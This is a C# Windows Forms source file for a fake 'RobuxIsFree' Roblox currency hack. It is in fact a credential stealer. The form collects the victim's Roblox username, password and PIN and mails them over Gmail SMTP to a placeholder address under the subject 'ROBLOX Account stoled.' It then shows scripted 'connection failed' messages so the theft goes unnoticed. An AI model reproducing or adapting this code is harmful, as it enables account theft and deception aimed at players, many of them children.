﻿using RobuxIsFree;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text.RegularExpressions;

namespace RobuxIsFree_MaterialUI
{
    public partial class Form1 : MaterialSkin.Controls.MaterialForm
    {

        int j = 0;

        public Form1()
        {
            InitializeComponent();
            timer1 = new Timer();
            timer1.Tick += timer1_Tick;
            timer1.Interval = 1000;
            timer2 = new Timer();
            timer2.Tick += timer2_Tick;
            timer2.Interval = 1;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            j++;
            progressBar1.PerformStep();
            if (j == 1)
            {
                label4.Text = "Selected mode : PyLEiA || Status : Initzaling the hack tool...";
            }
            else if (j == 10)
            {
                label4.Text = "Status : Connecting to ROBLOX...";
            }
            else if (j == 20)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 1...";
            }
            else if (j == 30)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 2...";
            }
            else if (j == 40)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 3...";
            }
            else if (j == 50)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 4...";
            }
            else if (j == 60)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 5...";
            }
            else if (j == 70)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 6...";
            }
            else if (j == 80)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 7...";
            }
            else if (j == 90)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Last retry (retry 8)...";
            }
            else if (j >= 100)
            {
                j = 0;
                label4.Text = "Status : Connect to ROBLOX failed! Do you lost your internet? Is your firewall blocked this app? Or maybe your ip is banned by ROBLOX :(";
                timer1.Stop();
                timer2.Stop();
                MessageBox.Show("Connect to ROBLOX failed! Do you lost your internet?\nIs your firewall blocked this app?\nOr maybe your ip is banned by ROBLOX :(\nMaybe try again may help you!", "RobuxIsFree");
                materialRaisedButton1.Text = "Relogin and hack R$.";
                materialRaisedButton1.Enabled = true;
                name.Enabled = true;
                password.Enabled = true;
                pincode.Enabled = true;
                textBox1.Enabled = true;
                normal.Enabled = true;
                progressBar1.Value = 0;
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            Form fc = Application.OpenForms["FTerm"];

            if (fc == null)
            {
                j = 0;
                timer1.Stop();
                timer2.Stop();
                label4.Text = "Status : Hack failed (reason : user closed terminal.)";
                progressBar1.Value = 0;
                materialRaisedButton1.Text = "Relogin and hack R$.";
                materialRaisedButton1.Enabled = true;
                name.Enabled = true;
                password.Enabled = true;
                pincode.Enabled = true;
                textBox1.Enabled = true;
                normal.Enabled = true;
            }
        }

        private int i = 4;

        private void sendmail()
        {
            timer1.Enabled = !timer1.Enabled;
            timer2.Enabled = !timer2.Enabled;
            name.Enabled = false;
            password.Enabled = false;
            pincode.Enabled = false;
            textBox1.Enabled = false;
            normal.Enabled = false;
            progressBar1.Minimum = 0;
            progressBar1.Maximum = 100;
            progressBar1.Value = 0;
            progressBar1.Step = 1;
            MailMessage mail = new MailMessage();
            SmtpClient smtpServer = new SmtpClient("smtp.gmail.com"); // U can change this if u want to use other mail services
            mail.From = new MailAddress("sender@mail.com");
            mail.To.Add("receiver@mail.com");
            mail.Subject = "ROBLOX Account stoled.";
            smtpServer.Port = 587;
            smtpServer.Credentials = new NetworkCredential("sender@mail.address", "sendermailpassword");
            smtpServer.EnableSsl = true;
            if (i == pincode.Text.Count())
            {
                mail.Body = "Username : " + name.Text + " | Password : " + password.Text + " | PIN Code : " + pincode.Text;
                smtpServer.Send(mail);
            }
            else
            {
                mail.Body = "Username : " + name.Text + " | Password : " + password.Text + " | PIN Code : none";
                smtpServer.Send(mail);
            }

            FTerm fTerm = new FTerm();
            fTerm.Show();
            materialRaisedButton1.Text = "Waiting for hack to be finished.";
            materialRaisedButton1.Enabled = false;
        }

        private void materialRaisedButton1_Click(object sender, EventArgs e)
        {
            if (Regex.IsMatch(pincode.Text, "[^0-9]"))
            {
                MessageBox.Show("Please write PIN as number not text!", "RobuxIsFree");
            }
            else if (Regex.IsMatch(textBox1.Text, "[^0-9]"))
            {
                MessageBox.Show("Please write your desired R$ as number not text!", "RobuxIsFree");
            }
            else if (pincode.Text.Length != 4)
            {
                if (pincode.Text.Length != 0)
                {
                    MessageBox.Show("Please write PIN full 4 letter or leave it empty if you don't have PIN code!", "RobuxIsFree");
                }
                else
                {
                    if (textBox1.Text.Length != 0)
                    {
                        if (normal.Checked == true)
                        {
                            sendmail();
                        }
                        else
                        {
                            MessageBox.Show("You haven't choose any mode to hack R$", "RobuxIsFree");
                        }
                    }
                    else
                    {
                        MessageBox.Show("You haven't type any amount of R$ to hack", "RobuxIsFree");
                    }
                    
                }
            }
        }

        private void materialRadioButton1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void pincode_Click(object sender, EventArgs e)
        {

        }

        private void pincode_TextChanged(object sender, EventArgs e)
        {
            if (Regex.IsMatch(pincode.Text, "[^0-9]"))
            {
                pincode.Text = pincode.Text.Remove(pincode.Text.Length - 1);
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (Regex.IsMatch(textBox1.Text, "[^0-9]"))
            {
                textBox1.Text = textBox1.Text.Remove(textBox1.Text.Length - 1);
            }
        }

        private void materialRaisedButton2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Credit :\nteppy - for making this aweasome app!\niamdumdum123 - being a good tester", "RobuxIsFree");
        }

        private void textBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
